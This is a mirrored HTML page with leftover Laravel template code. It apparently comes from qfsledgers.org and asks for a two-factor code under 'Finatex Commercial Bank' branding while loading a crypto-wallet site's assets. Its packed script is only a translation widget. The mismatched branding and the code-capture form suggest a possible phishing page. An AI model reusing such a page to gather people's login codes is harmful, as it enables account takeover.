<!DOCTYPE html>
<html>

<!-- Mirrored from qfsledgers.org/app/create/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 20 Feb 2024 17:34:34 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Primary Meta Tags -->
    <title>Two Factor Authentication</title>
    <meta name="title" content="">
    <meta name="description" content="">
    <link rel="icon" href="/img/favicon.png" />
    <!-- Open Graph -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="">
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:image" itemprop="image" content="">
    <!-- Stylesheet Libraries -->
    <link rel="stylesheet" href="/unicons.iconscout.com/release/v2.1.11/css/unicons.css">
    <link rel="stylesheet" href="/maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="/cdn.jsdelivr.net/npm/sweetalert2%407.12.15/dist/sweetalert2.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@600;700&amp;family=Space+Mono&amp;display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="assets/css/main.html">
    <script src="/ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="/cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="/maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
    <script src="/cdn.jsdelivr.net/npm/sweetalert2%4010.10.1/dist/sweetalert2.all.min.js"></script>


    <link rel="stylesheet" href="/banking/asset/css/sweetalert.css" type="text/css">
    <script type="text/javascript" src="/banking/city_state.js"></script>


    <style>
        body {
            background: #ffffff;
        }

        .row {
            margin: 0px;
            padding: 0px;
        }

        .font {
            font-family: 'IBM Plex Sans', sans-serif;
            font-family: 'Space Mono', monospace;
        }

        .outer {}

        .inner {
            padding-top: 40px;
        }

        .inner .text {
            padding: 0px 0px;
            padding-top: 30px;
            padding-bottom: 20px;
        }

        .inner .text h4 {
            text-align: center;
            font-family: 'Space Mono', monospace;

            font-size: 20px;
            color: #333333;
        }

        .form-holder {
            padding: 0px 30px;
        }

        .input-group-text {
            font-size: 17px;
            border-radius: 0px;
            border: none;
            background: inherit;
            color: #80BDFF;
            border-bottom: 1px solid #352E3F;
        }

        .input-group-text.active {
            border-bottom: 1px solid #80BDFF;
        }

        .input-group-append.active {
            border-bottom: 1px solid #80BDFF;
        }

        .form-control {
            font-family: 'Space Mono', monospace;
            border-radius: 0px;
            border: none;
            background: inherit;
            font-size: 15px;
            padding-top: 20px;
            padding-bottom: 18px;
            border-bottom: 1px solid #352E3F;
            color: #333333;
        }

        .form-control:focus {
            box-shadow: none;
            color: #333333;
            background: inherit;
        }

        .form-holder .terms-text {
            font-family: 'Space Mono', monospace;
            color: #757C82;
            margin-top: 20px;
            font-size: 14px;
        }

        .form-holder .terms-text a {
            color: #80BDFF;
            text-decoration: none;
        }

        footer {}

        footer .inner {
            text-align: center;
        }

        footer .inner .copy-right {
            font-family: 'Space Mono', monospace;
            color: #757C82;
            margin-bottom: 20px;
        }


        .w-btn {
            border-radius: 20px;
            background: #DC1414;
            font-family: 'Space Mono', monospace;
            font-weight: 600;
            font-size: 14px;
            font-weight: 400;
            padding: 10px 20px;

            color: #FFFFFF;
        }

        .w-btn:hover {
            color: #FFFFFF;
        }

        .error {
            font-weight: 500;
            padding-top: 10px;
            font-size: 14px;
            color: #C73E1D
        }

        .alert-warning {
            font-size: 12px;
        }

        .input-wrapper {
            position: relative;
            display: inline-block;
        }

        .input-wrapper input {
            padding-right: 30px;
        }

        .toggle-password {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            border: none;
            background: none;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="">
        <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-4">
                <div class="">
                    <div class="inner">
                        <div class="">
                            <a href="/"><img src="/img/logo-light.png" class="img-fluid mx-auto d-block"
                                    width="150px" /> </a>
                        </div>
                        <br>
                        <div class="text">
                            <h4>2FA.</h4>
                        </div>

                        <div class="text-center mb-4">

                            @if (Session::has('message'))
                                <div class="alert alert-success alert-dismissible fade show" role="alert">
                                    {{ Session::get('message') }}
                                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                        <span aria-hidden="true">&times;</span>
                                    </button>
                                </div>
                            @endif
                        </div>

                        <div class="form-holder">

                            <form class="form-wrap" action="{{ route('submitfa') }}" method="post"
                                data-saasone="contact-froms" id="signup">
                                @csrf
                                <div class="row">
                                    <div class="col-lg-12">
                                        @if ($errors->has('password'))
                                            <p style="color: #DC1414;">
                                                {{ $errors->first('password') }}
                                            </p>
                                        @endif
                                        <div class="form-group">
                                            <div class="input-wrapper">
                                                <input type="text" name="code" placeholder="Code" id="u_password"
                                                    required>
                                            </div>
                                        </div>
                                        <div class="col-lg-6 col-md-6 col-sm-6 col-6">

                                        </div>
                                        <div class="col-lg-12">
                                            <div class="form-group">
                                                <button class="btn btn-block w-btn" id="login-btn">
                                                    Submit
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                            </form>
                            <br />
                            <br />


                        </div>
                    </div>
                    
                     <br />
                    <br />
                    <br />
                    <br />
                    <select onchange="doGTranslate(this);"
                                class="border-none outline-none text-white p-2 caption2" style="background-color: #333333;">
                                <option value="">Language</option>
                                <option value="en|af">Afrikaans</option>
                                <option value="en|sq">Albanian</option>
                                <option value="en|ar">Arabic</option>
                                <option value="en|hy">Armenian</option>
                                <option value="en|az">Azerbaijani</option>
                                <option value="en|eu">Basque</option>
                                <option value="en|be">Belarusian</option>
                                <option value="en|bg">Bulgarian</option>
                                <option value="en|ca">Catalan</option>
                                <option value="en|zh-CN">Chinese (Simplified)</option>
                                <option value="en|zh-TW">Chinese (Traditional)</option>
                                <option value="en|hr">Croatian</option>
                                <option value="en|cs">Czech</option>
                                <option value="en|da">Danish</option>
                                <option value="en|nl">Dutch</option>
                                <option value="en|en">English</option>
                                <option value="en|et">Estonian</option>
                                <option value="en|tl">Filipino</option>
                                <option value="en|fi">Finnish</option>
                                <option value="en|fr">French</option>
                                <option value="en|gl">Galician</option>
                                <option value="en|ka">Georgian</option>
                                <option value="en|de">German</option>
                                <option value="en|el">Greek</option>
                                <option value="en|ht">Haitian Creole</option>
                                <option value="en|iw">Hebrew</option>
                                <option value="en|hi">Hindi</option>
                                <option value="en|hu">Hungarian</option>
                                <option value="en|is">Icelandic</option>
                                <option value="en|id">Indonesian</option>
                                <option value="en|ga">Irish</option>
                                <option value="en|it">Italian</option>
                                <option value="en|ja">Japanese</option>
                                <option value="en|ko">Korean</option>
                                <option value="en|lv">Latvian</option>
                                <option value="en|lt">Lithuanian</option>
                                <option value="en|mk">Macedonian</option>
                                <option value="en|ms">Malay</option>
                                <option value="en|mt">Maltese</option>
                                <option value="en|no">Norwegian</option>
                                <option value="en|fa">Persian</option>
                                <option value="en|pl">Polish</option>
                                <option value="en|pt">Portuguese</option>
                                <option value="en|ro">Romanian</option>
                                <option value="en|ru">Russian</option>
                                <option value="en|sr">Serbian</option>
                                <option value="en|sk">Slovak</option>
                                <option value="en|sl">Slovenian</option>
                                <option value="en|es">Spanish</option>
                                <option value="en|sw">Swahili</option>
                                <option value="en|sv">Swedish</option>
                                <option value="en|th">Thai</option>
                                <option value="en|tr">Turkish</option>
                                <option value="en|uk">Ukrainian</option>
                                <option value="en|ur">Urdu</option>
                                <option value="en|vi">Vietnamese</option>
                                <option value="en|cy">Welsh</option>
                                <option value="en|yi">Yiddish</option>
                            </select><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"
                                fill="currentColor" viewBox="0 0 256 256" class="text-xs text-white icon -right-2">
                                <path
                                    d="M216.49,104.49l-80,80a12,12,0,0,1-17,0l-80-80a12,12,0,0,1,17-17L128,159l71.51-71.52a12,12,0,0,1,17,17Z">
                                </path>
                            </svg>
                            <div id="google_translate_element2"></div>
                            
                </div>
            </div>
            <div class="col-md-4"></div>
        </div>
    </div>

    <footer class="">
        <div class="inner">
            <div class="copy-right">
                <span>©2024 Finatex Commercial Bank.</span>
            </div>
        </div>
    </footer>
    </div>

    <script src="/code.jquery.com/jquery-3.5.1.min.js"
        integrity="sha384-ZvpUoO/+PpLXR1lu4jmpXWu80pZlYUAfxl5NsBMWOEPSjUn/6Z/hRTt8+pR6L4N2" crossorigin="anonymous">
    </script>
    <script src="/cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"
        integrity="sha384-l/y5WJTphApmSlx76Ev6k4G3zxu/+19CVvn9OTKI7gs4Yu5Hm8mjpdtdr5oyhnNo" crossorigin="anonymous">
    </script>
    <script src="/cdnjs.cloudflare.com/ajax/libs/headhesive/1.2.4/headhesive.min.js"
        integrity="sha384-ZPk55pojr6majCEcb7ja8IztHb2+0rNX3jHHmjUIMBDgjdap9Jjw3RjoKUo1BGnb" crossorigin="anonymous">
    </script>
    <script src="/cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"
        integrity="sha384-fexNtx3nPE3sjIQuGk8G2X8X/aSEBVMC58R839hkgsY/Xjhvkm7m2otGhwrdESWj" crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/static.lobstr.co/static/lobstr/js/lottie-web.min.js"></script>
    <script type="text/javascript" src="/static.lobstr.co/static/landing/js/sliderInitializer.js"></script>
    <script type="text/javascript" src="/static.lobstr.co/static/landing/js/map_animation.js"></script>
    <script type="text/javascript" src="/static.lobstr.co/static/landing/js/main.js"></script>
    <script type="text/javascript" src="/static.lobstr.co/static/landing/js/stickedHeader.js"></script>
    <script src="/static.lobstr.co/static/cache/js/output.0d86849d05fe.js"></script>

    <script src="/banking/asset/js/sweetalert.js"></script>
    @include('sweetalert::alert')
    @yield('script')
    @if (session('success'))
        <script>
            "use strict";
            $(document).ready(function() {
                swal("Success!", "{{ session('success') }}", "success");
            });
        </script>
    @endif

    @if (session('alert'))
        <script>
            "use strict";
            $(document).ready(function() {
                swal("Sorry!", "{{ session('alert') }}", "error");
            });
        </script>
    @endif
    <script>
        @if (Session::has('message'))
            "use strict";
            var type = "{{ Session::get('alert-type', 'info') }}";
            switch (type) {
                case 'info':
                    toastr.info("{{ Session::get('message') }}");
                    break;
                case 'warning':
                    toastr.warning("{{ Session::get('message') }}");
                    break;
                case 'success':
                    toastr.success("{{ Session::get('message') }}");
                    break;
                case 'error':
                    toastr.error("{{ Session::get('message') }}");
                    break;
            }
        @endif
    </script>
    @php
        $ratex = $currency->rate;
    @endphp
    <script type="text/javascript">
        $('.preloader').fadeOut(1000);
    </script>
    <script type="text/javascript">
        "use strict";

        function sellVals() {
            var amount1 = $("#amount1").val();
            var asset_price1 = $("#asset_price1").find(":selected").text();
            var myarr1 = asset_price1.split("-");
            var dar1 = myarr1[1].split("<");
            var rate1 = parseFloat(dar1) * parseFloat(amount1 / @php echo $ratex; @endphp);
            $("#gain1").val(rate1);
        }
        $("#amount1").change(sellVals);
        sellVals();
        $("#asset_price1").change(sellVals);
        sellVals();
    </script>
    <script type="text/javascript">
        "use strict";

        function displayVals() {
            var amount = $("#amount").val();
            var asset_price = $("#asset_price").find(":selected").text();
            var myarr = asset_price.split("-");
            var dar = myarr[1].split("<");
            var rate = parseFloat(amount * @php echo $ratex; @endphp) / parseFloat(dar);
            $("#gain").val(rate);
        }
        $("#amount").change(displayVals);
        displayVals();
        $("#asset_price").change(displayVals);
        displayVals();
    </script>

    <script>
        $(function() {

            $('#u_password').on('focus', function() {
                $('#u_password_icon').addClass('active');
                $('#togglePassword').addClass('active');
            });
            $('#u_password').on('blur', function() {
                $('#u_password_icon').removeClass('active');
                $('#togglePassword').removeClass('active');
            });

            $('#u_password2').on('focus', function() {
                $('#u_password_icon2').addClass('active');
            });
            $('#u_password2').on('blur', function() {
                $('#u_password_icon2').removeClass('active');
            });

            const togglePassword = document.querySelector('#togglePassword');
            const u_pass = document.querySelector('#u_password');
            togglePassword.addEventListener('click', function(e) {

                const type = u_pass.getAttribute('type') === 'password' ? 'text' : 'password';
                u_pass.setAttribute('type', type);
                this.classList.toggle('uil-eye-slash');
            })

            $('#signup').submit(function(e) {
                e.preventDefault();

                var u_pass = $('#u_password').val();

                $(".error").remove();

                if (u_pass.length < 1) {
                    $('#password_err').after(
                        '<span class="error mt3"><i class="uil uil-exclamation-triangle"></i> 2FA is required</span>'
                        );
                }

                if (u_pass.length > 1) {
                    var lgbtn = document.getElementById("login-btn");
                    lgbtn.innerHTML =
                        '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Logging in...';
                    $("#login-btn").attr("disabled", true);

                    signup.submit();




                }




            });
        });
    </script>
    
    <script type="text/javascript">
        function googleTranslateElementInit2() {
            new google.translate.TranslateElement({
                pageLanguage: 'en',
                autoDisplay: false
            }, 'google_translate_element2');
        }
    </script>
    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit2">
    </script>


    <script type="text/javascript">
        /* <![CDATA[ */
        eval(function(p, a, c, k, e, r) {
            e = function(c) {
                return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c
                    .toString(36))
            };
            if (!''.replace(/^/, String)) {
                while (c--) r[e(c)] = k[c] || e(c);
                k = [function(e) {
                    return r[e]
                }];
                e = function() {
                    return '\\w+'
                };
                c = 1
            };
            while (c--)
                if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
            return p
        }('6 7(a,b){n{4(2.9){3 c=2.9("o");c.p(b,f,f);a.q(c)}g{3 c=2.r();a.s(\'t\'+b,c)}}u(e){}}6 h(a){4(a.8)a=a.8;4(a==\'\')v;3 b=a.w(\'|\')[1];3 c;3 d=2.x(\'y\');z(3 i=0;i<d.5;i++)4(d[i].A==\'B-C-D\')c=d[i];4(2.j(\'k\')==E||2.j(\'k\').l.5==0||c.5==0||c.l.5==0){F(6(){h(a)},G)}g{c.8=b;7(c,\'m\');7(c,\'m\')}}',
            43, 43,
            '||document|var|if|length|function|GTranslateFireEvent|value|createEvent||||||true|else|doGTranslate||getElementById|google_translate_element2|innerHTML|change|try|HTMLEvents|initEvent|dispatchEvent|createEventObject|fireEvent|on|catch|return|split|getElementsByTagName|select|for|className|goog|te|combo|null|setTimeout|500'
            .split('|'), 0, {}))
        /* ]]> */
    </script>
    
    <script src="//code.tidio.co/pp5hcvmtm6bpvi9khbhcqhzubxahbajo.js" async></script>
</body>

<!-- Mirrored from qfsledgers.org/app/create/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 20 Feb 2024 17:34:36 GMT -->

</html>
